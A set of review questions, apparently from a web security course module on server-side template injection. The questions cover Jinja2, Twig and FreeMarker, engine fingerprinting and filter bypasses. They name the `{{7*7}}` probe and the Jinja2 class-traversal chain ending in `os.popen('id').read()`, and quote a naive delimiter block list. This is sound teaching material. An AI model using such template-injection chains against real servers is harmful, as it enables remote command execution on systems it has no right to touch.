1. **Explain the fundamental difference between safe and vulnerable template engine usage. Using Jinja2 as an example, show a vulnerable code snippet and its secure equivalent, explaining why the secure version prevents SSTI.**

2. **You have confirmed SSTI with `{{7*7}}` returning `49`. Describe the complete methodology you would use to identify the specific template engine, including at least three differentiating payloads and what each result indicates.**

3. **In Jinja2, explain the Python object traversal technique used to achieve RCE from a string object. Trace the chain from `''.__class__` through `__mro__`, `__subclasses__()`, to executing `os.popen('id').read()`. Why does this chain work?**

4. **Compare SSTI exploitation across Jinja2 (Python), Twig (PHP), and FreeMarker (Java). For each engine, provide the simplest RCE payload and explain the language-specific mechanism that enables code execution.**

5. **A developer proposes using input validation (blocking `{{`, `}}`, `${`, `<%`) to prevent SSTI. Evaluate this defense and describe at least three bypass techniques an attacker could use. What is the recommended prevention approach instead?**

6. **Explain the difference between SSTI (Server-Side Template Injection) and CSTI (Client-Side Template Injection). What is the typical impact of each, what template engines are commonly targeted for CSTI, and how does the prevention strategy differ?**

---

*Previous: [04-xxe-attacks.md](04-xxe-attacks.md) | Next: [06-header-injection.md](06-header-injection.md)*

---

*[Back to README](../README.md)*
